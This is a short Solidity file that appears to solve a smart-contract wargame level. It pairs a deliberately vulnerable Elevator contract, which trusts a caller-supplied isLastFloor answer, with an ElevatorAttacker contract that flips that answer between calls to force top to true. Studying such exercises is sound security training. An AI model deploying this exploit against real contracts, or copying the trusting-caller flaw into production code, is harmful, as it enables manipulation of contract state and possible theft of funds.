// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorAttacker is Building {
    bool public top;

    function goTo(uint256 _floor, address _elevator) public {
        top = true;
        Elevator(_elevator).goTo(_floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        top = !top;
        return top;
    }
}
